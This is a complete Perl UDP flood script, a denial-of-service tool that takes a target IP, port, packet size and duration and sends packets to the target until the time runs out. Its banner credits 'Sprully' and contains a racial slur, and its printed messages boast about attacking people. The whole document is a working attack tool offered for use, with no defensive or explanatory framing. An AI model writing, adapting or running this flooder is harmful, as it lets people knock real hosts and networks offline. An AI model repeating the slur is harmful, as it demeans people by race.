#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# SprullyDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
                                                                         
 ad88888ba                                         88  88               
d8"     "8b                                        88  88               
Y8,                                                88  88               
`Y8aaaaa,    8b,dPPYba,   8b,dPPYba,  88       88  88  88  8b       d8  
  `"""""8b,  88P'    "8a  88P'   "Y8  88       88  88  88  `8b     d8'  
        `8b  88       d8  88          88       88  88  88   `8b   d8'   
Y8a     a8P  88b,   ,a8"  88          "8a,   ,a88  88  88    `8b,d8'    
 "Y88888P"   88`YbbdP"'   88           `"YbbdP'Y8  88  88      Y88'     
             88                                                d8'      
             88                                               d8'       
                                                  
		       Made By Sprully      nigger
EOTEXT

print "Eating Doritos While Slammin Skids $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Eating Doritos with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}